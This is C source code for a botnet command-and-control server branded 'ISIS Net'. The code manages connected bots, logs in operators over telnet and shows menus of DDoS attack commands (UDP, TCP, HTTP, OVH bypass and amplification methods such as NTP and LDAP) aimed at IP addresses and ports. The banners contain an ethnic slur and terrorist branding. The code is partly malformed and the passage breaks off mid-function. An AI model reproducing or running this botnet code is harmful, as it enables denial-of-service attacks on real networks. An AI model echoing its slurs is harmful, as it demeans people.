#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000

struct login_info {
	char username[100];
	char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
}}}}}}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}	
	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];	
		
        sprintf(user, "\e[1;36mUsername\e[97m: ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\e[1;31mPassword\e[97m: ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
		
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
		
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; Buildings Bombed %d  |  %s  %c", '\033', BotsConnected(), accounts[find_line].username, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		char ascii_banner_line1   [5000];
		char ascii_banner_line2   [5000];
		char ascii_banner_line3   [5000];
		char ascii_banner_line4   [5000];
		char ascii_banner_line5   [5000];
		char ascii_banner_line6   [5000];
		char ascii_banner_line7   [5000];
		char ascii_banner_line8   [5000];
		
  sprintf(ascii_banner_line1,  "\e[35m                                                                 \r\n");
  sprintf(ascii_banner_line2,   "\e[1;33m      ██╗███████╗\e[37m██╗███████╗\r\n");
  sprintf(ascii_banner_line3,   "\e[1;33m      ██║██╔════╝\e[37m██║██╔════╝\r\n");
  sprintf(ascii_banner_line4,   "\e[1;33m      ██║███████╗\e[37m██║███████╗\r\n");
  sprintf(ascii_banner_line5,   "\e[1;33m      ██║╚════██║\e[37m██║╚════██║\r\n");
  sprintf(ascii_banner_line6,   "\e[1;33m      ██║███████║\e[37m██║███████║\r\n");
  sprintf(ascii_banner_line7,   "\e[1;33m      ╚═╝╚══════╝\e[37m╚═╝╚══════╝\r\n");
  sprintf(ascii_banner_line8,   "\e[1;33m     💣 Welcome To ISIS Net 💣 \r\n");
 
  
  if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
   if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "count") || strstr(buf, "Count") || strstr(buf, "COUNT") || strstr(buf, "bots") || strstr(buf, "BOTS")) {
				char botcount [2048];
				memset(botcount, 0, 2048);
				char statuscount [2048];
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    "\e[35mBombs:   \e[32m%d\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(ops,         "\e[35mPaki Fags:   \e[32m%d\r\n", OperatorsConnected, scannerreport);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, ops, strlen(ops), MSG_NOSIGNAL) == -1) return;
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			
			if(strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "Help") || strstr(buf, "?") || strstr(buf, "command") || strstr(buf, "COMMAND")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char hp1  [800];
				char hp2  [800];
				char hp3  [800];
				char hp4  [800];
				char hp5  [800];
				char hp6  [800];
				char hp7  [800];
				char hp8  [800];
				char hp9  [800];
				char hp10  [800];
				char hp11  [800];      // \e[37m
				char hp12  [800];      // \e[1;33m
				char hp13  [800];
				char hp14  [800];

  sprintf(hp1,  "\e[1;33m ╔═════════════════╗             ╔═════════════════╗ \r\n");
  sprintf(hp2,  "\e[1;33m ║   \e[37mAllah Akbar   \e[1;33m║             ║\e[37mCCR: XXX-223-389 \e[1;33m║\r\n");
  sprintf(hp3,  "\e[1;33m ║\e[37mMade By: P A T H.\e[1;33m╠══════╦══════╣\e[37mDESC: NET-WSS    \e[1;33m║\r\n");
  sprintf(hp4,  "\e[1;33m ╚═════════════════╝      ║      ║\e[37mIPHM: \e[1;32mONLINE     \e[1;33m║\r\n");
  sprintf(hp5,  "\e[1;33m                          ║      ╚═════════════════╝\r\n");
  sprintf(hp6,  "\e[1;33m    ╔═════════════════════╩═════════════════════╗\r\n");
  sprintf(hp7,  "\e[1;33m    ║\e[37mMETHODS - Shows Normal DDoS Methods        \e[1;33m║\r\n");
  sprintf(hp8,  "\e[1;33m    ║\e[37mAPI     - Shows All API Methods            \e[1;33m║\r\n");
  sprintf(hp9,  "\e[1;33m    ║\e[37mIPHM    - Shows IP Header Methods          \e[1;33m║\r\n");
  sprintf(hp10, "\e[1;33m    ║\e[37mSPECIAL - Shows Special DDoS Methods       \e[1;33m║\r\n");
  sprintf(hp11, "\e[1;33m    ║\e[37mPORTS   - Shows A List Of Ports            \e[1;33m║\r\n");
  sprintf(hp12, "\e[1;33m    ║\e[37mBOTS    - Shows Bot Count                  \e[1;33m║\r\n");
  sprintf(hp13, "\e[1;33m    ║\e[37mSTATUS  - Shows Owners Social Media        \e[1;33m║\r\n");
  sprintf(hp14, "\e[1;33m    ╚═══════════════════════════════════════════╝\r\n");


				if(send(datafd, hp1,  strlen(hp1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp2,  strlen(hp2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp3,  strlen(hp3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp4,  strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp5,  strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp6,  strlen(hp6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp7,  strlen(hp7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp8,  strlen(hp8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp9,  strlen(hp9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp10,  strlen(hp10),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp11,  strlen(hp11),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp12,  strlen(hp12),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp13,  strlen(hp13),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp14,  strlen(hp14),	MSG_NOSIGNAL) == -1) goto end;

				
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "METHODS") || strstr(buf, "methods") || strstr(buf, "Method")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char ls1  [800];
				char ls2  [800];
				char ls3  [800];
				char ls4  [800]; // \e[37m
				char ls5  [800];
				char ls6  [800];
				char ls7  [800];
				char ls8  [800];
				char ls9  [800];

  sprintf(ls1,  "\e[1;33m ╔══════════════════════════════════════════╗╔═════════╗\r\n");
  sprintf(ls2,  "\e[1;33m ║\e[37m!* UDP [IP] [PORT] [TIME] 32 0 10         \e[1;33m║║\e[37mTCP FLAGS\e[1;33m║\r\n");
  sprintf(ls3,  "\e[1;33m ║\e[37m!* TCP [IP] [PORT] [TIME] 32 FLAGS 0 10   \e[1;33m║║   \e[37mSYN   \e[1;33m║\r\n");
  sprintf(ls4,  "\e[1;33m ║\e[37m!* STD [IP] [PORT] [TIME]                 \e[1;33m║║   \e[37mACK   \e[1;33m║\r\n");
  sprintf(ls5,  "\e[1;33m ║\e[37m!* FLUX [IP] [PORT] [TIME] 32 1024 1      \e[1;33m║║   \e[37mFIN   \e[1;33m║\r\n");
  sprintf(ls6,  "\e[1;33m ║\e[37m!* HTTPHEX GHP 80 / TIME POWER            \e[1;33m║║   \e[37mPSH   \e[1;33m║\r\n");
  sprintf(ls7,  "\e[1;33m ╠═══════════════════════╦══════════════════╣║   \e[37mRST   \e[1;33m║\r\n");
  sprintf(ls8,  "\e[1;33m ║\e[37m!* STOP = STOPS ATTACKS\e[1;33m║\e[37mBest Method: STD  \e[1;33m║╚═════════╝\r\n");
  sprintf(ls9,  "\e[1;33m ╚═══════════════════════╩══════════════════╝           \r\n");
				
				if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls7,  strlen(ls7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls9,  strlen(ls9),	MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}

 						if(strstr(buf, "API") || strstr(buf, "api") || strstr(buf, "Api")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char ls1  [800];
				char ls2  [800];
				char ls3  [800];
				char ls4  [800]; // \e[37m
				char ls5  [800];
				char ls6  [800];

  sprintf(ls1,  "\e[1;33m ╔══════════════════════════════════════════╦══╗\r\n");
  sprintf(ls2,  "\e[1;33m ║\e[37m!* ZAP [IP] [PORT] [TIME]                 \e[1;33m║\e[1;31m<3\e[1;33m║\r\n");
  sprintf(ls3,  "\e[1;33m ║\e[37m!* 100UP [IP] [PORT] [TIME]               \e[1;33m╚══╣\r\n");
  sprintf(ls4,  "\e[1;33m ║\e[37m!* PAKI [WEBSITE IP] [443] [60]              \e[1;33m║\r\n");
  sprintf(ls5,  "\e[1;33m ║\e[37m!* NUKE [HOME IP] [443/80] [TIME]            \e[1;33m║\r\n");
  sprintf(ls6,  "\e[1;33m ╚═════════════════════════════════════════════╝\r\n");
				
				if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}

 		 			if(strstr(buf, "IPHM") || strstr(buf, "iphm") || strstr(buf, "Iphm")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char s2  [800];
				char s3  [800];
				char s4  [800];
				char s5  [800];
				char s6  [800];
				char s7  [800];
				char s8  [800];
				char s9  [800];  // \e[37m
				char s10  [800];
				char s11  [800];
				char s12  [800];
				char s13  [800];

  sprintf(s2,    "\e[1;33m ╔════════════════╗         ╔════════════════╗    \r\n"); 
  sprintf(s3,    "\e[1;33m ║ \e[37mIPH Method Hub \e[1;33m║         ║   \e[37mTime: 300s   \e[1;33m║    \r\n");
  sprintf(s4,    "\e[1;33m ╠═══════╦╦═══════╣         ╚╗ \e[37mALLAH AKBAR  \e[1;33m╔╝    \r\n");
  sprintf(s5,    "\e[1;33m ║ \e[37mLDAP  \e[1;33m║║ \e[37mTFTP  \e[1;33m╠════════╗ ║  \e[37mDON'T SPAM  \e[1;33m║     \r\n");
  sprintf(s6,    "\e[1;33m ║ \e[37mNTP   \e[1;33m║║ \e[37mSSDP  \e[1;33m╠═══════╗║ ╚══════╦╦══════╝     \r\n");
  sprintf(s7,    "\e[1;33m ║ \e[37mSNMP  \e[1;33m║║ \e[37mTELNET\e[1;33m╠══════╗║║        ║║            \r\n");
  sprintf(s8,    "\e[1;33m ╚═══════╩╩═══════╝      ║║║        ║║            \r\n");
  sprintf(s9,    "\e[1;33m                         ║║║        ║║              \r\n");
  sprintf(s10,   "\e[1;33m          ╔══════════════╩╩╩════════╩╩════╗         \r\n");
  sprintf(s11,   "\e[1;33m          ║            \e[37mUsage:             \e[1;33m║         \r\n");
  sprintf(s12,   "\e[1;33m          ║\e[37m!* [METHOD] [IP] [PORT] [TIME] \e[1;33m║         \r\n");
  sprintf(s13,   "\e[1;33m          ╚═══════════════════════════════╝         \r\n");

 
				if(send(datafd, s2,  strlen(s2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s3,  strlen(s3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s4,  strlen(s4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s5,  strlen(s5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s6,  strlen(s6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s7,  strlen(s7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s8,  strlen(s8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s9,  strlen(s9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s10,  strlen(s10),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s11,  strlen(s11),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s12,  strlen(s12),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s13,  strlen(s13),	MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}

 		 						if(strstr(buf, "SPECIAL") || strstr(buf, "special") || strstr(buf, "Special")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char ls1  [800];
				char ls2  [800];
				char ls3  [800];
				char ls4  [800]; // \e[37m
				char ls5  [800];
				char ls6  [800];

  sprintf(ls1,  "\e[1;33m ╔══════════════════════════════════════════╦══╗\r\n");
  sprintf(ls2,  "\e[1;33m ║\e[37m!* OVH [IP] [PORT] [TIME]                 \e[1;33m║\e[1;31m<3\e[1;33m║\r\n");
  sprintf(ls3,  "\e[1;33m ║\e[37m!* SLAP-OVH [IP] [PORT] [TIME] [1024]     \e[1;33m╚══╣\r\n");
  sprintf(ls4,  "\e[1;33m ║\e[37m!* VPN [IP] [PORT] [TIME] [1604]             \e[1;33m║\r\n");
  sprintf(ls5,  "\e[1;33m ║\e[37m!* NFO [IP] [PORT] [TIME] [1337]             \e[1;33m║\r\n");
  sprintf(ls6,  "\e[1;33m ╚═════════════════════════════════════════════╝\r\n");

				
				if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}

 			if(strstr(buf, "Ports") || strstr(buf, "PORTS") || strstr(buf, "ports")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char s2  [800];
				char s3  [800];
				char s4  [800];
				char s5  [800];
				char s6  [800];
				char s7  [800];
				char s8  [800];
				char s9  [800];
				char s10  [800];
				char s11  [800];
				char s12  [800];
				char s13  [800];
				char s14  [800];
                char s15  [800];
                char s16  [800];

                sprintf(s2,    "\e[1;33m   ╔═════════════════════════╗\r\n");
                sprintf(s3,    "\e[1;33m╔══╝      \e[37m[+] Ports [+]      \e[1;33m╚══╗\r\n");
                sprintf(s4,    "\e[1;33m║\e[37m \e[37m21   \e[30m=   \e[1;33m(\e[1;31mSFTP\e[1;33m)               \e[1;33m║\r\n");
                sprintf(s5,    "\e[1;33m║\e[37m \e[37m22   \e[30m=   \e[1;33m(\e[1;31mSSH\e[1;33m)                \e[1;33m║\r\n");
                sprintf(s6,    "\e[1;33m║\e[37m \e[37m23   \e[30m=   \e[1;33m(\e[1;31mTELNET\e[1;33m)             \e[1;33m║\r\n");
                sprintf(s7,    "\e[1;33m║\e[37m \e[37m25   \e[30m=   \e[1;33m(\e[1;31mSMTP\e[1;33m)               \e[1;33m║\r\n");
                sprintf(s8,    "\e[1;33m║\e[37m \e[37m53   \e[30m=   \e[1;33m(\e[1;31mDNS\e[1;33m)                \e[1;33m║\r\n");
                sprintf(s9,    "\e[1;33m║\e[37m \e[37m69   \e[30m=   \e[1;33m(\e[1;31mTFTP\e[1;33m)               \e[1;33m║\r\n");
                sprintf(s10,   "\e[1;33m║\e[37m \e[37m80   \e[30m=   \e[1;33m(\e[1;31mHTTP\e[1;33m)               \e[1;33m║\r\n");
                sprintf(s11,   "\e[1;33m║\e[37m \e[37m443  \e[30m=   \e[1;33m(\e[1;31mHTTPS\e[1;33m)              \e[1;33m║\r\n");
                sprintf(s12,   "\e[1;33m║\e[37m \e[37m3074 \e[30m=   \e[1;33m(\e[1;31mXBOX\e[1;33m)               \e[1;33m║\r\n");
                sprintf(s13,   "\e[1;33m║\e[37m \e[37m5060 \e[30m=   \e[1;33m(\e[1;31mRTP\e[1;33m)                \e[1;33m║\r\n");
                sprintf(s14,   "\e[1;33m║\e[37m \e[37m9307 \e[30m=   \e[1;33m(\e[1;31mPLAYSTATION\e[1;33m)        \e[1;33m║\r\n");
                sprintf(s15,   "\e[1;33m╚══╗                         ╔══╝\r\n");
                sprintf(s16,   "\e[1;33m   ╚═════════════════════════╝          \r\n");
 
				if(send(datafd, s2,  strlen(s2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s3,  strlen(s3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s4,  strlen(s4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s5,  strlen(s5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s6,  strlen(s6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s7,  strlen(s7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s8,  strlen(s8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s9,  strlen(s9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s10,  strlen(s10),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s11,  strlen(s11),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s12,  strlen(s12),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s13,  strlen(s13),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s14,  strlen(s14),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s15,  strlen(s15),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s16,  strlen(s16),	MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}

 						if(strstr(buf, "STATUS") || strstr(buf, "status") || strstr(buf, "Status")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char ls1  [800];
				char ls2  [800];
				char ls3  [800];
				char ls4  [800]; // \e[37m
				char ls5  [800];
				char ls6  [800];
				char ls7  [800];
				char ls8  [800];
